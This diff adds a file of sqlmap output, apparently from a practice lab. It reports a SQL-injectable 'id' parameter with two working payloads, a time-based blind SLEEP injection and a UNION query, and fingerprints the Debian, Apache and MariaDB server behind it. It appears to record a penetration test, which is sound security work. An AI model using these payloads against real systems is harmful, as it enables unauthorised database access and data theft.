@@ -1,0 +1,16 @@
+sqlmap identified the following injection point(s) with a total of 75 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: id=1' AND (SELECT 3418 FROM (SELECT(SLEEP(5)))sOgC) AND 'GoIK'='GoIK&Submit=Submit
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT CONCAT(0x7178716271,0x4f4b467a66667744466f6f54744e4d536a784d666e556a5179414e7562475a667650536c6476714b,0x7176627871),NULL-- -&Submit=Submit
+---
+web server operating system: Linux Debian
+web application technology: Apache 2.4.64
+back-end DBMS operating system: Linux Debian
+back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
+banner: '11.8.2-MariaDB-1 from Debian'
